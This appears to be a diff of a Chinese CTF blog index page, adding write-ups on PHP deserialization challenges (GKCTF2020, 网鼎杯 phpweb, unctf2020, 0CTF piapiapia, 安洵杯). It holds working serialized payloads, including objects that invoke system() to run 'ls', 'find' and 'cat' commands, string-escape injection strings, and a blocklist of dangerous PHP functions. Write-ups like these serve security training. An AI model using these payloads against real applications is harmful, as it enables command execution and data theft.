class="line">echo urlencode(serialize($hack));</span><br></pre></td></tr></table></figure>
+
+
       
 
       
@@ -503,7 +435,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/11/03/PHP-session反序列化/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/01/25/反序列化之pop链/">展开全文 >></a>
         </p>
       
 
@@ -533,30 +465,45 @@
 
 
   
-    <article id="post-序列化与反序列化" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post--GKCTF2020-cve版签到-网鼎杯-2020-朱雀组-phpweb" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/10/25/序列化与反序列化/">序列化与反序列化</a>
+      <a class="article-title" href="/2021/01/20/-GKCTF2020-cve版签到-网鼎杯-2020-朱雀组-phpweb/">[GKCTF2020]cve版签到&amp;&amp;[网鼎杯 2020 朱雀组]phpweb</a>
     </h1>
   
 
         
-        <a href="/2019/10/25/序列化与反序列化/" class="archive-article-date">
-  	<time datetime="2019-10-25T07:21:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-25</time>
+        <a href="/2021/01/20/-GKCTF2020-cve版签到-网鼎杯-2020-朱雀组-phpweb/" class="archive-article-date">
+  	<time datetime="2021-01-20T12:06:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-20</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="php的序列化与反序列化"><a href="#php的序列化与反序列化" class="headerlink" title="php的序列化与反序列化"></a>php的序列化与反序列化</h2><p>通俗的说，序列化就是将变量通过一系列的操作转化为字符串的过程；而反序列化就是其逆过程，将字符串还原成原来的变量；<br>进行序列化与反序列化操作，可以轻松地存储和传输数据。 </p>
-        
-          <a class="article-more-a" href="/2019/10/25/序列化与反序列化/#more">more >></a>
-        
+        <h2 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h2><h3 id="cve-2020-7066"><a href="#cve-2020-7066" class="headerlink" title="cve-2020-7066"></a>cve-2020-7066</h3><p>在低于7.2.29的PHP版本7.2.x，低于7.3.16的7.3.x和低于7.4.4的7.4.x中，将get_headers（）与用户提供的URL一起使用时，如果URL包含零（\ 0）字符，则URL将被静默地截断。这可能会导致某些软件对get_headers（）的目标做出错误的假设，并可能将某些信息发送到错误的服务器。</p>
+<p>题目用%00截断，先看下本地：</p>
+<pre><code>?url=http://127.0.0.1%00www.ctfhub.com</code></pre><p>发现提示：</p>
+<pre><code>[4] =&gt; Tips: Host must be end with &apos;123&apos;</code></pre><p>于是访问：</p>
+<pre><code>?url=http://127.0.0.123%00www.ctfhub.com</code></pre><p>得到flag。</p>
+<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>打开题目，查看源码，发现用表单提交两个参数：func和p；<br>题目过一会，就会刷新一次，并且会显示当前时间；<br>抓包发现提交的数据为：func=date&amp;p=Y-m-d+h%3Ai%3As+a<br>猜测可能用的是call_user_func(函数名，参数)函数</p>
+<p>call_user_func — 把第一个参数作为回调函数调用</p>
+<p>于是改包，查看下源码：</p>
+<pre><code>func=file_get_contents&amp;p=index.php</code></pre><p>得到源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $disable_fun = <span class="keyword">array</span>(<span class="string">"exec"</span>,<span class="string">"shell_exec"</span>,<span class="string">"system"</span>,<span class="string">"passthru"</span>,<span class="string">"proc_open"</span>,<span class="string">"show_source"</span>,<span class="string">"phpinfo"</span>,<span class="string">"popen"</span>,<span class="string">"dl"</span>,<span class="string">"eval"</span>,<span class="string">"proc_terminate"</span>,<span class="string">"touch"</span>,<span class="string">"escapeshellcmd"</span>,<span class="string">"escapeshellarg"</span>,<span class="string">"assert"</span>,<span class="string">"substr_replace"</span>,<span class="string">"call_user_func_array"</span>,<span class="string">"call_user_func"</span>,<span class="string">"array_filter"</span>, <span class="string">"array_walk"</span>,  <span class="string">"array_map"</span>,<span class="string">"registregister_shutdown_function"</span>,<span class="string">"register_tick_function"</span>,<span class="string">"filter_var"</span>, <span class="string">"filter_var_array"</span>, <span class="string">"uasort"</span>, <span class="string">"uksort"</span>, <span class="string">"array_reduce"</span>,<span class="string">"array_walk"</span>, <span class="string">"array_walk_recursive"</span>,<span class="string">"pcntl_exec"</span>,<span class="string">"fopen"</span>,<span class="string">"fwrite"</span>,<span class="string">"file_put_contents"</span>);</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">gettime</span><span class="params">($func, $p)</span> </span>&#123;</span><br><span class="line">       $result = call_user_func($func, $p);</span><br><span class="line">       $a= gettype($result);</span><br><span class="line">       <span class="keyword">if</span> ($a == <span class="string">"string"</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> $result;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">""</span>;&#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">       <span class="keyword">var</span> $p = <span class="string">"Y-m-d h:i:s a"</span>;</span><br><span class="line">       <span class="keyword">var</span> $func = <span class="string">"date"</span>;</span><br><span class="line">       <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">           <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">""</span>) &#123;</span><br><span class="line">               <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   $func = $_REQUEST[<span class="string">"func"</span>];</span><br><span class="line">   $p = $_REQUEST[<span class="string">"p"</span>];</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> ($func != <span class="keyword">null</span>) &#123;</span><br><span class="line">       $func = strtolower($func);</span><br><span class="line">       <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">           <span class="keyword">echo</span> gettime($func, $p);</span><br><span class="line">       &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">"Hacker..."</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>查看源码发现，基本上可以使用的危险函数都给过滤掉了；不过发现有一个很多余的地方，test类没有被用到。<br>大概可以猜到用反序列化了。</p>
+<p>用到的脚本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span><span class="params">($func, $p)</span> </span>&#123;</span><br><span class="line">    $result = call_user_func($func, $p);</span><br><span class="line">    $a= gettype($result);</span><br><span class="line">    <span class="keyword">if</span> ($a == <span class="string">"string"</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">""</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">"cat /tmp/flagoefiu4r93"</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">"system"</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">""</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$c = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<pre><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:4:&quot;ls /&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} //查看当前路径下文件
+func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:18:&quot;find / -name flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;}   //找flag在哪里
+O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;}   //获得flag</code></pre>
       
 
       
@@ -568,7 +515,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/10/25/序列化与反序列化/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/01/20/-GKCTF2020-cve版签到-网鼎杯-2020-朱雀组-phpweb/">展开全文 >></a>
         </p>
       
 
@@ -598,35 +545,92 @@
 
 
   
-    <article id="post-hackergame2019部分题解" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-反序列化字符逃逸" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/10/20/hackergame2019部分题解/">hackergame2019部分题解</a>
+      <a class="article-title" href="/2021/01/20/反序列化字符逃逸/">反序列化字符逃逸</a>
     </h1>
   
 
         
-        <a href="/2019/10/20/hackergame2019部分题解/" class="archive-article-date">
-  	<time datetime="2019-10-20T09:48:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-20</time>
+        <a href="/2021/01/20/反序列化字符逃逸/" class="archive-article-date">
+  	<time datetime="2021-01-20T10:19:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-20</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>##签到题：<br>token后面有一个显示按钮，点击显示，token就出来了，复制，打开题目网址，把token放进框里，发现获取flag的按钮无法点击，F12查看元素，把该按钮的属性<br>disabled=”disabled”改为abled=”disabled”，即可获取flag；</p>
-<hr>
-<p>##白与夜：<br>打开题目网址，看到一个cat图片，点开图片，what? flag就这样出来了？<br>flag{4_B14CK_C4T}</p>
-<hr>
-<p>##信息安全2077：<br>打开题目，提示比赛时间还没开始，<br>Not yet! The competition will start after 21165 days and 54068<br>于是想到了改时间，刚开始有点憨憨的，一直在尝试修改电脑本地的时间日期，一直没改对；哎，怎么没想到，可以用burpsuit直接改包啊！！！<br>刚开始忘了如何打开.txt文件，百度了一下，<br>202.38.93.241:2077/?myfile = fopen(“flag.txt”, “r”)</p>
-<p>抓到的包：<br>GET / HTTP/1.1<br>Host: 202.38.93.241:2077<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0</p>
-<p>.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: keep-alive<br>Upgrade-Insecure-Requests: 1<br>If-Modified-Since: Sun, 13 Oct 2019 13:34:45 GMT<br>If-None-Match: “1570973685.0-1234-3182889908”<br>Cache-Control: max-age=0</p>
-<p>POST /flag.txt HTTP/1.1<br>Host: 202.38.93.241:2077<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) HEICORE/49.1.2623.213 Safari/537.36<br>Accept: <em>/</em><br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Referer: <a href="http://202.38.93.241:2077/" target="_blank" rel="noopener">http://202.38.93.241:2077/</a><br>If-Unmodified-Since: Sun, 20 Oct 2019 09:02:49 GMT<br>Origin: <a href="http://202.38.93.241:2077" target="_blank" rel="noopener">http://202.38.93.241:2077</a><br>Connection: keep-alive<br>Pragma: no-cache<br>Cache-Control: no-cache<br>Content-Length: 0</p>
-<p>一共两个包，把相应的时间都改了，改为2077年，就可以了；</p>
+        <h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="unctf2020-easyunserialize"><a href="#unctf2020-easyunserialize" class="headerlink" title="unctf2020 easyunserialize"></a>unctf2020 easyunserialize</h3><p>题目：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $uname;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($uname,$password)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uname=$uname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">'easy'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">                <span class="keyword">echo</span> $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'wrong password'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'challenge'</span>,<span class="string">'easychallenge'</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uname=$_GET[<span class="number">1</span>];</span><br><span class="line">$password=<span class="number">1</span>;</span><br><span class="line">$ser=filter(serialize(<span class="keyword">new</span> a($uname,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>传入一个名为1的参数，赋值给uname,对参数进行序列化处理，然后将序列化结果中的所有challenge替换为easychallenge，最后反序列化后password===easy就能拿到flag。</p>
+<p>a:2:{i:0;s:8:”Hed9eh0g”;i:1;s:5:”aaaaa”;}abc对于这个字符串，进行反序列化时，，第一个右括号之后的字符都是作废的外的，说明反序列化的过程是有一定的识别范围的，根据这个特性，把部分需要的序列化过的字符串加入到原字符串中：<br>此题中需要的字符串为：  “;s:8:”password”;s:4:”easy”;}<br>我们需要构造出类似这样的字符串：O:1:”a”:2:{s:5:”uname”;s:13:”easychallenge”;s:8:”password”;i:1;}</p>
+<p>filter这个函数，是做这个题的关键，每一个challenge字符的出现可以增加4个字符。</p>
+<p>“;s:8:”password”;s:4:”easy”;}是29个字符</p>
+<p>可以构造这样的算式：9x+29=13x，这样的x得出的不会是整数，必须得让需要的那部分是4的倍数，于是可以这样构造：<br>“;s:8:”password”;s:4:”easy”;} 29</p>
+<p>“;s:8:”password”;s:4:”easy”;s:2:”a”} 36</p>
+<p>9x+36=13x 得x=9,于是可以需要9个challenge，可以构造：</p>
+<pre><code>?1=challengechallengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:2:&quot;a&quot;}</code></pre><p>得到flag。</p>
+<p>经过序列化后：</p>
+<pre><code>O:1:&quot;a&quot;:2:{s:5:&quot;uname&quot;;s:117:&quot;challengechallengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:2:&quot;a&quot;}&quot;;s:8:&quot;password&quot;;i:1;}</code></pre><p>再过滤：</p>
+<pre><code>O:1:&quot;a&quot;:2:{s:5:&quot;uname&quot;;s:117:&quot;easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:2:&quot;a&quot;}&quot;;s:8:&quot;password&quot;;i:1;} </code></pre><h3 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h3><p>源码泄露，<a href="http://www.zip获取源码，然后进行代码审计。" target="_blank" rel="noopener">www.zip获取源码，然后进行代码审计。</a><br>先理清大致过程，<br>注册–&gt;登陆–&gt;更新信息–&gt;显示信息</p>
+<p>把所有源码大概看了一下，发现在update.php的第28行中进行了序列化处理。把传入的数据以数组的形式存储，然后对数组进行序列化；<img src="https://gitee.com/hmanl0u/picgo/raw/master/20210204095826.png" alt></p>
+<p>继续跟进到user类的update_profile中，发现会对序列化的字符串进行过滤；</p>
+<p><img src="https://gitee.com/hmanl0u/picgo/raw/master/20210204100032.png" alt></p>
+<p>然后去查看这个filter，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">		$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">		$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">		$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">		$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">		$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这就很明显了，非常符合字符串逃逸。</p>
+<p>在更新信息的时候，我们可以对nickname进行修改，让他序列化后覆盖掉photo的值，令photo的值为config.php（因为我们在查看config.php时发现了flag变量），代码对nickname的长度进行了限定，可以用数组绕过；</p>
+<p>然后开始构造nickname的值</p>
+<p>常规思路我们需要的字符串是：”;s:5:”photo”;s:10:”config.php”;}</p>
+<p>但是，这里由于nickname是数组，我们需要先对数组进行闭合，所以有：”;}s:5:”photo”;s:10:”config.php”;}   一共是34个字符，我们需要逃逸34个字符；</p>
+<p>使用select、insert、update、delete的话，用hacker替换，都是6变6，所以选用where，</p>
+<p>用一个where可以逃逸1个字符，所以需要34个where，于是payload为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>经过序列化以及过滤后为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;13339215489&quot;;s:5:&quot;email&quot;;s:16:&quot;123456789@qq.com&quot;;s:10:&quot;nickname[]&quot;;s:204:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload/dd7ec931179c4dcb6a8ffb8b8786d20b&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>更改数据时，抓包，修改nickname为数组nickname[],并且修改其值，然后去查看信息profile.php;查看页面源代码，会发现base64编码，解码得flag；</p>
+<p><img src="https://gitee.com/hmanl0u/picgo/raw/master/20210204101759.png" alt></p>
+<h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先通读代码，在倒数第四行有提示，去phpinfo看看。</p>
+<p>​    <img src="https://gitee.com/hmanl0u/picgo/raw/master/20210325180824.png" alt></p>
+<p>看到flag字样，可能是解题的关键，每一个php文件都包含这个文件；尝试访问，访问不到；</p>
+<p>猜测flag可能在这个文件中，尝试读取这个文件</p>
+<p>然后回到代码，在最后一行发现file_get_contents函数，可以读取文件，然后一直溯源他的变量；</p>
+<p>$userinfo[‘img’]–&gt;$serialize_info–&gt;$_SESSION</p>
+<p>如果对$_SESSION这个变量进行控制，就可以读取想要的文件，</p>
+<p>然后发现extract函数，extract($_POST);很明显，我们可以通过post$_Session变量，实现extract变量覆盖，进而控制相应的变量。</p>
+<p>从$_SESSION到$userinfo[‘img’]变量赋值期间，进行了filter过滤以及序列化，反序列化,仔细观察，符合字符串逃逸的条件。</p>
+<p>接着确认我们需要的东西，然后一步步的构造：</p>
+<p>$_SESSION[img]在extract函数之后赋值，无法覆盖，只能从$_SESSION[function]下手，把img序列化的值写到function里边；</p>
+<p>需要的str：”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}</p>
+<p>然后还需要字符串逃逸，通过过滤函数，把flag、php等关键字过滤，实现逃逸</p>
+<p>需要的str：”;s:8:”function”;s:5:”hello”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}</p>
+<p>进一步构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&apos;user&apos;]=&apos;flagflagflagflagflagflagphp&apos;;</span><br><span class="line">$_SESSION[&quot;function&quot;]=hi&quot;;s:8:&quot;function&quot;;s:5:&quot;hello&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最终的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?f=show_image</span><br><span class="line">post:_SESSION[user]=flagflagflagflagflagflagphp&amp;_SESSION[function]=hihi&quot;;s:8:&quot;function&quot;;s:5:&quot;hello&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个payload被序列化后：</p>
